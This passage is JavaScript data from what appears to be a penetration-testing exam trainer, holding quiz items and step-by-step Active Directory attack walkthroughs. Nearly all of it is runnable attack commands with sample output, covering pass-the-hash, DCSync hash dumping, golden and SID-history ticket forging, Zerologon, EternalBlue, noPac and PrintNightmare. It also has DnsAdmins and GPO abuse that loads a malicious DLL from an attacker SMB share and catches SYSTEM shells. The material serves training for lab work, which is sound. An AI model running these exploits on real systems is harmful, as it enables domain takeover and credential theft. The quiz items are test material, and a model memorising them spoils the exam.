    "gmsa-read": {situation:"BloodHound shows a group you are in has ReadGMSAPassword over svc_gmsa$. What does that hand you?", choices:["gmsa-read","kerberoast","crack-tgs","laps-read"], coach:{"kerberoast":"gMSAs have long random passwords that will not crack; you can read the hash directly instead.","crack-tgs":"No cracking is needed or possible here; the managed-password read gives you the NT hash outright.","laps-read":"That reads a machine's local-admin password; this reads a gMSA's domain-account hash, a different attribute."}},
    "laps-read": {situation:"A group you belong to has ReadLAPSPassword over WS01. What is the direct payoff?", choices:["laps-read","gmsa-read","dump-secrets","shadow-credentials"], coach:{"gmsa-read":"That reads a gMSA domain-account hash; LAPS read gives a specific machine's local-admin password in cleartext.","dump-secrets":"That comes after you are admin on the host; the LAPS read is how you get that local-admin access.","shadow-credentials":"That abuses write access to add a key; LAPS read is a pure read of a delegated attribute."}},
    "delegation-abuse": {situation:"Enumeration shows a delegation setting but you are not yet sure which attack applies. What do you do first?", choices:["delegation-abuse","unconstrained-delegation","getst-impersonation","kerberoast"], coach:{"unconstrained-delegation":"That is one branch; first identify the delegation type, because constrained and RBCD need different plays.","getst-impersonation":"The cash-in for the constrained or RBCD branch; first determine which type you are dealing with.","kerberoast":"Unrelated; delegation abuse is about borrowing identities, not cracking SPN tickets."}},
    "unconstrained-delegation": {situation:"You have admin on WEB01, which is trusted for unconstrained delegation. How do you turn that into domain compromise?", choices:["unconstrained-delegation","coerce-auth","getst-impersonation","silver-ticket"], coach:{"coerce-auth":"Part of this play, the trigger, but on its own it does nothing; the unconstrained host caching the DC's TGT is what wins.","getst-impersonation":"That is the constrained or RBCD cash-in; unconstrained delegation captures the DC's TGT instead.","silver-ticket":"Needs a service hash you do not have; capturing the DC's TGT from the unconstrained host is the move here."}},
    "getst-impersonation": {situation:"You just wrote RBCD so OBOL$ can act for users on WEB01. How do you become Administrator on WEB01?", choices:["getst-impersonation","unconstrained-delegation","silver-ticket","dcsync"], coach:{"unconstrained-delegation":"That is the TGT-capture branch; you set up RBCD, so the cash-in is an S4U ticket via getST.","silver-ticket":"Needs WEB01's hash; RBCD lets you mint the impersonation ticket without it, via getST.","dcsync":"Needs replication rights; here you have delegation to one host, so impersonate Administrator to it with getST."}},
    "coerce-auth": {situation:"You have ntlmrelayx waiting to relay to LDAP, but nothing is connecting. What is the missing piece?", choices:["coerce-auth","unconstrained-delegation","getst-impersonation","dcsync"], coach:{"unconstrained-delegation":"A different consumer of coerced auth; either way you still need to trigger the DC to authenticate first.","getst-impersonation":"That is the cash-in after the relay sets up RBCD; nothing happens until you coerce the DC to authenticate.","dcsync":"Needs rights you do not have yet; coercion plus the relay is how you get them."}},
    "adcs-esc": {situation:"You have a domain credential and find a CA in the environment. What is the one command that tells you whether it is abusable?", choices:["adcs-esc","cert-authenticate","kerberoast","dcsync"], coach:{"cert-authenticate":"That is the step after you mint a cert; first find whether a vulnerable template exists.","kerberoast":"Unrelated to certificate services; certipy find -vulnerable is the ADCS check.","dcsync":"Needs replication rights; an ESC abuse can get you there, but first enumerate the templates."}},
    "cert-authenticate": {situation:"You minted administrator.pfx via an ADCS ESC abuse. How do you turn that certificate into a usable login and hash?", choices:["cert-authenticate","adcs-esc","shadow-credentials","dcsync"], coach:{"adcs-esc":"Already done, that produced the certificate; now authenticate with it via PKINIT.","shadow-credentials":"Another way to obtain a cert (via GenericWrite); you already have one, so authenticate with it.","dcsync":"Comes after, using the TGT or hash this step recovers; the certificate alone is just a file until you auth with it."}}
  };
  Object.keys(AD3_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = AD3_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === AD LANE : batch 4 (Lateral, Dumping & Dominance, AD CVEs, Service & Policy) ===============
  var AD4_LEADUPS = {
    "lateral-exec": [
      { key: "pwn3d", label: "nxc showed Pwn3d! on a host", steps: [
        { title: "You are admin on a host", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.20 -u svc_admin -p 'Password123'", out: "SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)", sig: "(Pwn3d!)", teach: "Pwn3d! means local admin; now pick an execution tool by how noisy you can afford to be." } ] },
    ],
    "ticket-reuse": [
      { key: "ticket", label: "You have a ticket or a hash", steps: [
        { title: "You dumped or forged a ticket", tool: "ls", where: "local", cmd: "ls -la administrator.ccache", out: "-rw-r--r-- 1 kali kali 1389 administrator.ccache", sig: "administrator.ccache", teach: "A ticket is an identity you can wear until it expires, with no password needed." } ] },
    ],
    "dump-secrets": [
      { key: "admin", label: "You are admin on a host or DC", steps: [
        { title: "Admin access confirmed", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --local-auth", out: "SMB  10.10.10.10  445  DC01  [+] DC01\\administrator (Pwn3d!)", sig: "(Pwn3d!)", teach: "Admin anywhere means its secrets; admin on a DC means the whole domain." } ] },
    ],
    "dcsync": [
      { key: "repl", label: "You hold replication rights", steps: [
        { title: "An account with replication rights", tool: "bloodyAD", where: "local", cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u svc_backup -p 'P@ss' get object 'DC=acme,DC=internal' --attr nTSecurityDescriptor", out: "svc_backup: DS-Replication-Get-Changes-All", sig: "DS-Replication-Get-Changes-All", teach: "Replication rights, from DA or an ACL abuse, let you ask the DC for password data." } ] },
    ],
    "own-domain-pth": [
      { key: "hashes", label: "You dumped every domain hash", steps: [
        { title: "DCSync handed you the hashes", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc-user administrator", out: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c:::", sig: "Administrator:500:", teach: "The built-in Administrator's NT hash is in the dump; pass it, do not crack it." } ] },
    ],
    "sid-history-abuse": [
      { key: "krbtgt", label: "You hold krbtgt and a trust exists", steps: [
        { title: "krbtgt in hand, a forest trust nearby", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump 'acme.internal/administrator'@10.10.10.10 -just-dc-user krbtgt", out: "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::", sig: "krbtgt:502:", teach: "With krbtgt and a trust, inject a privileged SID to climb to the forest root." } ] },
    ],
    "zerologon-check": [
      { key: "dc", label: "A DC that might be unpatched", steps: [
        { title: "An older DC build", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10", out: "SMB  10.10.10.10  445  DC01  [*] Windows Server 2016 Build 14393 x64", sig: "Build 14393", teach: "An older build is a reason to run the safe Zerologon check before anything destructive." } ] },
    ],
    "zerologon-exploit": [
      { key: "confirmed", label: "The check said VULNERABLE", steps: [
        { title: "Zerologon check confirmed vulnerable", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -M zerologon", out: "ZEROLOGON  10.10.10.10  445  DC01  VULNERABLE", sig: "VULNERABLE", teach: "Only now, after the safe check, and only if you will restore the machine password afterward." } ] },
    ],
    "eternalblue": [
      { key: "ms17", label: "nmap flagged MS17-010", steps: [
        { title: "SMBv1 flagged VULNERABLE", tool: "nmap", where: "local", cmd: "nmap -p445 --script smb-vuln-ms17-010 10.10.10.40", out: "| smb-vuln-ms17-010:\n|   State: VULNERABLE", sig: "State: VULNERABLE", teach: "An unpatched SMBv1 server is unauthenticated SYSTEM RCE; prefer the scripted exploit on the exam." } ] },
    ],
    "nopac": [
      { key: "credunpatched", label: "A credential and a maybe-unpatched DC", steps: [
        { title: "Any domain credential works", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!'", out: "SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs", sig: "acme.internal\\jbloggs", teach: "noPac needs only a valid credential and an unpatched DC, one of the fastest escalations when it fits." } ] },
    ],
    "printnightmare": [
      { key: "spooler", label: "The Print Spooler is running", steps: [
        { title: "Spooler is up on the target", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.20 -u jbloggs -p 'Autumn2026!' -M spooler", out: "SPOOLER  10.10.10.20  445  WEB01  Spooler service is running", sig: "Spooler service is running", teach: "A running Spooler plus a domain credential is a reliable route to SYSTEM." } ] },
    ],
    "ms14-068": [
      { key: "oldDC", label: "A genuinely old DC", steps: [
        { title: "A legacy DC and a low-priv credential", tool: "nxc", where: "local", cmd: "nxc smb 10.10.10.10", out: "SMB  10.10.10.10  445  DC01  [*] Windows Server 2008 R2 Build 7601 x64", sig: "Build 7601", teach: "A decade-old DC is worth a quick MS14-068 check; it can take a basic user straight to DA." } ] },
    ],
    "gpo-abuse": [
      { key: "edge", label: "BloodHound shows GPO write", steps: [
        { title: "Write over a GPO", tool: "bloodhound", where: "local", cmd: "# BloodHound edge: jbloggs -[GenericWrite]-> Default Domain Policy", out: "jbloggs  GenericWrite  Default Domain Policy (GPO)", sig: "GenericWrite  Default Domain Policy", teach: "Write over a GPO is SYSTEM on every computer it applies to; cash it in." } ] },
    ],
    "dnsadmins-abuse": [
      { key: "group", label: "You are in DnsAdmins", steps: [
        { title: "You landed in DnsAdmins", tool: "nxc", where: "local", cmd: "nxc ldap 10.10.10.10 -u svc_dns -p 'P@ss' --query \"(sAMAccountName=svc_dns)\" \"memberOf\"", out: "memberOf: CN=DnsAdmins,CN=Users,DC=acme,DC=internal", sig: "CN=DnsAdmins", teach: "DnsAdmins can make the DC's DNS service load your DLL as SYSTEM, a direct DC privesc." } ] },
    ],
    "wsus-abuse": [
      { key: "wsus", label: "A WSUS server on cleartext HTTP", steps: [
        { title: "Clients point at an HTTP WSUS", tool: "reg", where: "host", cmd: "reg query \"HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v WUServer", out: "WUServer    REG_SZ    http://wsus.acme.internal:8530", sig: "http://wsus.acme.internal:8530", teach: "A WSUS server on cleartext HTTP is MITM-able; a bogus update runs as SYSTEM on clients." } ] },
    ],
    "sccm-enum": [
      { key: "sccm", label: "SCCM is in the environment", steps: [
        { title: "SCCM turned up in enumeration", tool: "nxc", where: "local", cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --query \"(objectClass=mSSMSManagementPoint)\" \"dNSHostName\"", out: "dNSHostName: sccm.acme.internal", sig: "sccm.acme.internal", teach: "An SCCM management point is a high-value target; enumerate it for credentials or code execution." } ] },
    ]
  };
  Object.keys(AD4_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = AD4_LEADUPS[k]; });

  var AD4_HOW = {
    "lateral-exec": {"lead":"Three tools, chosen by noise: psexec (loud), wmiexec (quieter), evil-winrm (full shell on 5985). Pass-the-hash drives all three.","items":[
      {"t":"Quiet: wmiexec","d":"wmiexec runs over WMI with no service dropped, semi-interactive.","demo":[{"run":"impacket-wmiexec acme.internal/svc_admin:'Password123'@10.10.10.20","out":"[*] SMBv3.0 dialect used\nC:\\Windows\\system32> whoami\nweb01\\administrator","sig":"web01\\administrator"}],"note":"No service, less noise; a good choice on a monitored box."},
      {"t":"Full shell: evil-winrm","d":"When 5985 is open, evil-winrm gives a real PowerShell session.","demo":[{"run":"evil-winrm -i 10.10.10.20 -u svc_admin -p 'Password123'","out":"*Evil-WinRM* PS C:\\Users\\svc_admin\\Documents>","sig":"Evil-WinRM* PS"}],"note":"A comfortable interactive shell when WinRM is available."},
      {"t":"Pass-the-hash, no plaintext","d":"Swap -p for -hashes and any of these tools runs with just the NT hash.","demo":[{"run":"impacket-psexec -hashes :2b9c0d1e3f4a5b6c7d8e9f0a1b2c3d4e administrator@10.10.10.20","out":"[*] Creating service on 10.10.10.20\nC:\\Windows\\system32>","sig":"C:\\Windows\\system32>"}],"note":"psexec is reliable but drops a service, the loud option; use it when noise is fine."}]},
    "ticket-reuse": {"lead":"On Linux, point KRB5CCNAME at the ccache and add -k; on Windows, Rubeus injects a .kirbi; overpass-the-hash turns a hash into a TGT.","items":[
      {"t":"Pass-the-ticket on Linux","d":"Export KRB5CCNAME and run any impacket tool with -k -no-pass.","demo":[{"run":"export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal","out":"[*] Requesting shares on dc01.acme.internal\nC:\\Windows\\system32>","sig":"C:\\Windows\\system32>"}],"note":"You are Administrator via the ticket, with no password typed."},
      {"t":"Overpass-the-hash","d":"getTGT turns an NT hash into a fresh TGT when you have the hash but not a ticket.","demo":[{"run":"impacket-getTGT acme.internal/administrator -hashes :2b9c0d1e3f4a5b6c7d8e9f0a1b2c3d4e","out":"[*] Saving ticket in administrator.ccache","sig":"Saving ticket in administrator.ccache"}],"note":"NTLM to Kerberos: export KRB5CCNAME and -k tools work where only the hash was available."},
      {"t":"Pass-the-ticket on Windows","d":"Rubeus ptt injects a .kirbi into your current logon session.","demo":[{"run":"Rubeus.exe ptt /ticket:administrator.kirbi","out":"[+] Ticket successfully imported!","sig":"Ticket successfully imported!"}],"note":"klist now shows the ticket; your session acts as that principal."}]},
    "dump-secrets": {"lead":"secretsdump pulls SAM/LSA/cached from a host, or NTDS.dit from a DC, remotely or offline.","items":[
      {"t":"Dump a host's local secrets","d":"--sam pulls the local SAM hashes over SMB.","demo":[{"run":"nxc smb 10.10.10.20 -u administrator -p 'P@ss' --local-auth --sam","out":"SAM  Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a1c7e2f...:::\nSAM  svc_local:1001:aad3b...:7f3e9d...:::","sig":"Administrator:500:"}],"note":"Local SAM hashes to pass or crack; svc_local may reuse elsewhere."},
      {"t":"Dump the domain (NTDS) on a DC","d":"secretsdump -just-dc replicates every account's hash from the DC.","demo":[{"run":"impacket-secretsdump acme.internal/administrator:'P@ss'@10.10.10.10 -just-dc","out":"[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\nkrbtgt:502:aad3b...:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::\nAdministrator:500:aad3b...:31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c:::","sig":"krbtgt:502:"}],"note":"The whole domain's hashes, krbtgt included, which is effectively game over."},
      {"t":"Dump offline from pulled files","d":"If you pulled SYSTEM and NTDS.dit, dump them locally with no DC contact.","demo":[{"run":"impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL","out":"[*] Reading and decrypting hashes from ntds.dit\nAdministrator:500:aad3b...:31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c:::","sig":"Reading and decrypting hashes from ntds.dit"}],"note":"No DC contact needed once you have the files."}]},
    "dcsync": {"lead":"secretsdump -just-dc uses replication to pull hashes without logging onto the DC; target krbtgt for golden tickets.","items":[
      {"t":"Replicate every hash","d":"-just-dc asks the DC to replicate all account password data.","demo":[{"run":"impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc","out":"[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b...:31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c:::\nkrbtgt:502:aad3b...:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::","sig":"DRSUAPI method"}],"note":"No login to the DC; replication alone hands over every hash."},
      {"t":"Grab just krbtgt","d":"-just-dc-user krbtgt pulls only the key you need for golden tickets.","demo":[{"run":"impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc-user krbtgt","out":"krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::","sig":"krbtgt:502:"}],"note":"The krbtgt hash is both loot and the golden-ticket key."},
      {"t":"DCSync with a granted ACL","d":"If an ACL abuse gave you replication rights, nxc --ntds pulls the hashes over DRSUAPI as your own user.","demo":[{"run":"nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --ntds","out":"NTDS  10.10.10.10  445  DC01  [+] Dumping the NTDS.dit via DRSUAPI\nAdministrator:500:aad3b...:31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c:::","sig":"via DRSUAPI"}],"note":"Once you granted yourself GetChangesAll, --ntds DCSyncs as jbloggs (no local admin on the DC needed)."}]},
    "own-domain-pth": {"lead":"Pass the RID 500 NT hash straight into a login, confirm Domain Admin, take a shell, read the flags.","items":[
      {"t":"Pass the Administrator hash","d":"nxc -H with the NT hash logs in as Administrator with no password.","demo":[{"run":"nxc smb 10.10.10.10 -u administrator -H 31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c -x whoami","out":"SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator (Pwn3d!)\nSMB  10.10.10.10  445  DC01  acme\\administrator","sig":"(Pwn3d!)"}],"note":"Pwn3d! as the domain's Administrator, straight from the hash."},
      {"t":"Take an interactive shell","d":"psexec with the hash gives a SYSTEM shell on the DC.","demo":[{"run":"impacket-psexec -hashes :31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c administrator@dc01.acme.internal","out":"[*] Creating service on dc01.acme.internal\nC:\\Windows\\system32> whoami\nnt authority\\system","sig":"nt authority\\system"}],"note":"SYSTEM on the DC; the domain is yours."},
      {"t":"Read the flags","d":"Grab the proof files to close out the box.","demo":[{"run":"type C:\\Users\\Administrator\\Desktop\\proof.txt","out":"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6","sig":"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"}],"note":"Capture proof.txt; this is the box."}]},
    "sid-history-abuse": {"lead":"Forge a ticket with an extra SID (Enterprise Admins of the forest root); the rights ride along invisibly.","items":[
      {"t":"Get both domain SIDs","d":"You need this domain's SID and the target forest-root domain's SID.","demo":[{"run":"impacket-lookupsid acme.internal/administrator@10.10.10.10 | grep 'Domain SID'","out":"[*] Domain SID is: S-1-5-21-1127051588-2557081730-3523236190","sig":"Domain SID is: S-1-5-21"}],"note":"The root SID plus 519 is Enterprise Admins; that is the SID to inject."},
      {"t":"Forge with the extra SID","d":"ticketer -extra-sid adds the forest root's Enterprise Admins to the ticket.","demo":[{"run":"impacket-ticketer -nthash 1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8 -domain-sid S-1-5-21-1127051588-2557081730-3523236190 -domain acme.internal -extra-sid S-1-5-21-9988776655-1122334455-6677889900-519 administrator","out":"[*] Saving ticket in administrator.ccache","sig":"Saving ticket in administrator.ccache"}],"note":"The ticket now carries Enterprise Admins of the root, across the trust."},
      {"t":"Use it against the forest root","d":"The injected SID grants rights the account never shows in group memberships.","demo":[{"run":"export KRB5CCNAME=administrator.ccache && impacket-secretsdump -k -no-pass dc01.corp.internal -just-dc-user krbtgt","out":"krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f:::","sig":"krbtgt:502:"}],"note":"You DCSync the forest root; one child compromise became the whole forest."}]},
    "zerologon-check": {"lead":"The check verifies the patch level without changing anything; always run it before the destructive exploit.","items":[
      {"t":"Run the safe check","d":"The scanner tests the Netlogon crypto flaw without resetting anything.","demo":[{"run":"nxc smb 10.10.10.10 -M zerologon","out":"ZEROLOGON  10.10.10.10  445  DC01  VULNERABLE","sig":"VULNERABLE"}],"note":"VULNERABLE means the exploit would work; a patched DC prints 'not vulnerable', and nothing changes either way."},
      {"t":"Confirm with the standalone scanner","d":"The public scanner double-checks without touching the machine account.","demo":[{"run":"python3 zerologon_tester.py DC01 10.10.10.10","out":"Success! DC can be fully compromised by a Zerologon attack.","sig":"can be fully compromised"}],"note":"Both agree it is vulnerable; now decide whether the destructive exploit is worth it."},
      {"t":"Document either result","d":"A patched DC is a finding too; record it and move on.","demo":[{"run":"nxc smb 10.10.10.10 -M zerologon | tee scans/zerologon.txt","out":"ZEROLOGON  10.10.10.10  445  DC01  VULNERABLE","sig":"VULNERABLE"}],"note":"Save the evidence; the check never alters the DC, so it is always safe to run."}]},
    "zerologon-exploit": {"lead":"This is destructive: empty the machine password, dump NTDS, then RESTORE the original hash. The restore is part of the exploit.","items":[
      {"t":"Empty the DC machine password","d":"The exploit resets DC01$'s password to empty via the Netlogon flaw.","demo":[{"run":"python3 cve-2020-1472-exploit.py DC01 10.10.10.10","out":"Success! Target vulnerable, resetting the machine account password\nResult: 0\nExploit complete, machine account password set to empty.","sig":"password set to empty"}],"note":"The DC is now broken until you restore it; dump immediately, then fix it."},
      {"t":"Dump with the empty password","d":"A null machine login now DCSyncs the whole domain.","demo":[{"run":"impacket-secretsdump -no-pass 'acme.internal/DC01$'@10.10.10.10 -just-dc","out":"krbtgt:502:aad3b...:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::\nDC01$:1000:aad3b...:5b2e8c1f0a3d6e9b2c5f8a1d4e7b0c3f:::","sig":"krbtgt:502:"}],"note":"You have every hash; note DC01$'s original hash for the restore."},
      {"t":"Restore the machine password","d":"Reinstall DC01$'s original hash so Netlogon and replication recover.","demo":[{"run":"python3 restorepassword.py acme.internal/DC01@DC01 -target-ip 10.10.10.10 -hexpass 5b2e8c1f0a3d6e9b2c5f8a1d4e7b0c3f","out":"[*] Change password OK\nMachine account password restored.","sig":"password restored"}],"note":"Never leave a DC with an empty machine password; the restore is mandatory, not optional."}]},
    "eternalblue": {"lead":"With VULNERABLE confirmed, a scripted public exploit lands a SYSTEM shell; it can BSOD, so treat it as known-good, not a spray.","items":[
      {"t":"Confirm the target","d":"Re-run the nmap script to be sure before firing a risky exploit.","demo":[{"run":"nmap -p445 --script smb-vuln-ms17-010 -oN scans/ms17010.txt 10.10.10.40","out":"|   State: VULNERABLE (MS17-010)\n|   IDs: CVE:CVE-2017-0143","sig":"VULNERABLE (MS17-010)"}],"note":"Confirmed; now run the scripted exploit, which is reliable on a true positive."},
      {"t":"Run the scripted exploit","d":"The AutoBlue-style script sends a reverse-shell payload that runs as SYSTEM.","demo":[{"run":"python3 eternalblue_exploit7.py 10.10.10.40 shellcode/sc_x64.bin","out":"[+] Exploit successful\n(listener)  nt authority\\system","sig":"nt authority\\system"}],"note":"SYSTEM with no credentials; catch it on your listener."},
      {"t":"Mind the BSOD risk","d":"A failed run can blue-screen the target, so do not blind-spray it.","demo":[{"run":"# fire only against a confirmed-VULNERABLE host","out":"[!] Fire only against confirmed-vulnerable hosts; failures can crash the box","sig":"can crash the box"}],"note":"A known-good exploit against confirmed targets, never a blind attempt across a subnet."}]},
    "nopac": {"lead":"Rename a machine account to clash with the DC, request a privileged ticket, then DCSync or get a SYSTEM shell.","items":[
      {"t":"Check the DC patch level","d":"The scanner confirms the DC is missing the 42278/42287 fixes before you fire.","demo":[{"run":"nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M nopac","out":"NOPAC  10.10.10.10  445  DC01  VULNERABLE (CVE-2021-42278 / CVE-2021-42287)","sig":"VULNERABLE (CVE-2021-42278"}],"note":"Vulnerable; the straight-line escalation is available."},
      {"t":"Run noPac to a SYSTEM shell","d":"noPac creates a machine, renames it to impersonate the DC, and requests a ticket.","demo":[{"run":"noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 --impersonate administrator -shell","out":"[+] Got TGT for administrator\n[*] Launching semi-interactive shell\nC:\\Windows\\system32>","sig":"Got TGT for administrator"}],"note":"From a bare user to SYSTEM on the DC in one command."},
      {"t":"Or go straight to a dump","d":"-dump DCSyncs instead of opening a shell.","demo":[{"run":"noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -dump","out":"Administrator:500:aad3b...:31a9f3b7c2e5d08a1b4c6d9e0f2a3b5c:::\nkrbtgt:502:aad3b...:1a59bd44e5e3b0f0a1c2d3e4f5a6b7c8:::","sig":"krbtgt:502:"}],"note":"A low-priv credential straight to every domain hash."}]},
    "printnightmare": {"lead":"Point the Spooler at a malicious DLL served from your box; it loads as SYSTEM, remotely or locally.","items":[
      {"t":"Serve the payload DLL","d":"Host the DLL on an SMB share the target can reach.","demo":[{"run":"impacket-smbserver share ./ -smb2support","out":"[*] Config file parsed\n[*] Incoming connection from 10.10.10.20\n[*] AUTHENTICATE_MESSAGE (acme\\WEB01$)","sig":"Incoming connection"}],"note":"The DLL is served; now make the Spooler load it."},
      {"t":"Fire the remote exploit","d":"The CVE-2021-1675 script makes the target Spooler load your DLL as SYSTEM.","demo":[{"run":"CVE-2021-1675.py acme.internal/jbloggs:'Autumn2026!'@10.10.10.20 '\\\\10.10.14.5\\share\\evil.dll'","out":"[+] Spooler is vulnerable\n[+] Stage0: triggered\n(listener)  nt authority\\system","sig":"nt authority\\system"}],"note":"SYSTEM on WEB01 via the Print Spooler."},
      {"t":"Local privesc variant","d":"On a box where you already have a shell, the local exploit elevates to SYSTEM.","demo":[{"run":"powershell -ep bypass -c \"Invoke-Nightmare -NewUser hacker -NewPassword P@ss123!\"","out":"[+] Created user hacker as a local administrator","sig":"Created user hacker as a local administrator"}],"note":"The local-priv variant adds a local admin through the same Spooler flaw."}]},
    "ms14-068": {"lead":"Forge a PAC claiming Domain Admin; on an unpatched DC the KDC accepts it, giving a golden-ticket-like TGT.","items":[
      {"t":"Confirm the patch gap first","d":"The build number tells you whether MS14-068 could even apply.","demo":[{"run":"nxc smb 10.10.10.10 | grep Build","out":"[*] Windows Server 2008 R2 Build 7601 x64 (name:DC01) (domain:acme.internal)","sig":"Build 7601"}],"note":"A 2008 R2 DC is old enough that MS14-068 is worth trying."},
      {"t":"Forge the PAC and run as DA","d":"goldenPac automates the MS14-068 PAC forgery and runs a command as Domain Admin.","demo":[{"run":"impacket-goldenPac -dc-ip 10.10.10.10 acme.internal/jbloggs:'Autumn2026!'@dc01.acme.internal","out":"[*] Attempting to exploit MS14-068\n[*] Got privileged TGT, injecting\nC:\\Windows\\system32>","sig":"Got privileged TGT"}],"note":"A low-priv user just became SYSTEM on the DC via the forged PAC."},
      {"t":"Fall back to the manual PyKEK path","d":"When goldenPac fails, ms14-068.py forges the ticket for manual reuse.","demo":[{"run":"ms14-068.py -u jbloggs@acme.internal -p 'Autumn2026!' -s S-1-5-21-1127051588-2557081730-3523236190-1104 -d 10.10.10.10","out":"[+] Building AS-REQ\n[+] Saved TGT to TGT_jbloggs@acme.internal.ccache","sig":"Saved TGT to TGT_jbloggs"}],"note":"Reuse that ccache with -k like any other forged ticket."}]},
    "gpo-abuse": {"lead":"Push an immediate scheduled task or a local-admin membership through the GPO; it runs fleet-wide on refresh.","items":[
      {"t":"Abuse the GPO from Linux","d":"pygpoabuse adds an immediate task that runs your command as SYSTEM.","demo":[{"run":"pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command \"net localgroup administrators jbloggs /add\"","out":"[+] ScheduledTask TASK_a1b2 created\n[+] Tasks created, wait for the GPO refresh","sig":"ScheduledTask"}],"note":"On the next refresh, jbloggs becomes local admin on every machine in scope."},
      {"t":"Target the right GPO","d":"Pick a GPO linked to the OU holding your target machines.","demo":[{"run":"nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --query \"(objectClass=groupPolicyContainer)\" \"displayName gPCFileSysPath\"","out":"displayName: Default Domain Policy\ngPCFileSysPath: \\\\acme.internal\\SysVol\\acme.internal\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}","sig":"Default Domain Policy"}],"note":"Confirm which GPO is linked where before you edit it."},
      {"t":"Force a refresh or wait","d":"GPO changes apply on the next refresh cycle (about 90 minutes) or on reboot.","demo":[{"run":"gpupdate /force","out":"Updating policy...\nComputer Policy update has completed successfully.","sig":"update has completed successfully"}],"note":"gpupdate /force applies it at once where you can run it; otherwise wait for the cycle."}]},
    "dnsadmins-abuse": {"lead":"Point the DNS service at a malicious DLL via a registry value, then restart it to load your code as SYSTEM on the DC.","items":[
      {"t":"Set the ServerLevelPluginDll","d":"A DnsAdmins member can write the plugin-DLL registry value on the DC.","demo":[{"run":"nxc smb 10.10.10.10 -u svc_dns -p 'P@ss' -x \"reg add HKLM\\System\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll /t REG_SZ /d \\\\10.10.14.5\\share\\dns.dll\"","out":"The operation completed successfully.","sig":"operation completed successfully"}],"note":"The DNS service will load that UNC DLL on its next start."},
      {"t":"Restart the DNS service","d":"Restarting the DNS service loads the plugin DLL as SYSTEM.","demo":[{"run":"nxc smb 10.10.10.10 -u svc_dns -p 'P@ss' -x \"sc.exe stop dns && sc.exe start dns\"","out":"(listener)  nt authority\\system","sig":"nt authority\\system"}],"note":"The DC's DNS service loaded your DLL as SYSTEM; you own the DC."},
      {"t":"Clean the registry value","d":"Remove the plugin DLL value afterward so DNS starts cleanly.","demo":[{"run":"nxc smb 10.10.10.10 -u svc_dns -p 'P@ss' -x \"reg delete HKLM\\System\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll /f\"","out":"The operation completed successfully.","sig":"operation completed successfully"}],"note":"Tidy up so the DNS service is not left pointing at a missing DLL."}]},
    "wsus-abuse": {"lead":"From a MITM or relay position, push a fake update that each client runs as SYSTEM on check-in.","items":[
      {"t":"Confirm the cleartext WSUS","d":"The WUServer registry value shows the update server and whether it uses HTTP.","demo":[{"run":"reg query \"HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v WUServer","out":"WUServer    REG_SZ    http://wsus.acme.internal:8530","sig":"http://wsus.acme.internal:8530"}],"note":"http:// (not https) means the channel is MITM-able."},
